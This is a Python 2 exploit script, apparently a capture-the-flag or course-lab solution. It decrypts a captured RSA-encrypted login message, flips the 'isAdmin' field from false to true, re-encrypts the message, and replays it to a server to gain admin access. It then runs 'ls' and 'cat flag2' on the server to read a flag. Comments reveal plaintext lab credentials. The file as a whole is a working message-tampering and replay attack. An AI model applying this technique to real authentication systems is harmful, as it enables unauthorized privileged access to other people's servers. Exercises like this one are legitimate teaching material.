import os
import socket
import config


def handle_cipher():
    # msg is the orignal login msg
    f = open('data/msg.txt', 'r')
    msg = f.read()
    f.close()

    # write the cipher info, remove the header info
    cipherText = msg[8:]  # first 8 char is header
    f = open('data/ciphertext.txt', 'w')
    f.write(cipherText)
    f.close()

    # decrypt the cipher
    key = 'key/private.pem'
    fin = 'data/ciphertext.txt'
    fout = 'data/plaintext.txt'
    cmd = 'openssl rsautl -decrypt -inkey ' + key + ' -in ' + fin + ' -out ' + fout
    os.system(cmd)
    # get following:
    # {"username":"NetworkSecurity","password":"projectissoeasy","isAdmin":false}d86083dccf261011ce3ca716bf2bba2c41a4d4766a275f36434b1484ea68cb04

    # read the plaintext we just decrypt
    f = open('data/plaintext.txt', 'r')
    plainText = f.read()
    f.close()

    # analysis the plaintext, and generate the new plaintext
    ticket = plainText[75:]
    # d86083dccf261011ce3ca716bf2bba2c41a4d4766a275f36434b1484ea68cb04
    loginInfo = plainText[:69] + 'true}'
    # {"username":"NetworkSecurity","password":"projectissoeasy","isAdmin":true}
    newPlaintext = loginInfo + ticket

    # write the new loginMsg into file
    f = open('data/newPlaintext.txt', 'w')
    f.write(newPlaintext)
    f.close()

    # encrypt the new plaintext
    key = 'key/public.pem'
    fin = 'data/newPlaintext.txt'
    fout = 'data/newCiphertext.txt'
    cmd = 'openssl rsautl -encrypt -pubin -inkey ' + key + ' -in ' + fin + ' -out ' + fout
    os.system(cmd)

    # append the header, also '00000256'
    f = open('data/newCiphertext.txt', 'r')
    newCipher = f.read()
    f.close()

    # write the new login info into file
    f = open('data/newMsg.txt', 'w')
    f.write(msg[:8] + newCipher)
    f.close()


def main():
    # get the login info, which is extracted from the packet
    handle_cipher()
    f = open('data/newMsg.txt', 'r')
    msg = f.read()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (config.HOST, config.PORT)
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    sock.sendall(msg)  # replay login message
    sock.sendall('ls\r\n')  # to list the file
    sock.sendall('cat flag2\r\n')  # to get flag1

    # send login
    while True:
        data = sock.recv(1024)
        if data:
            print data

    print 'Close the socket!'
    sock.close()

if __name__ == '__main__':
    main()
